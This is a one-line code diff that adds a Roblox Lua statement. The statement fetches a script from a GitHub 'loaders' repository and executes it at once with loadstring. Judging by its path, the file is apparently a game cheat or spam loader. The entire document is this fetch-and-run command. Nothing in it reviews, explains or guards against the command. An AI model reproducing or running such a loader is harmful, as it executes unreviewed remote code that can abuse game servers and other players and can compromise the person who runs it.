@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/runaways-beta-spam2-44rk33ydh06x2q.lua"))()
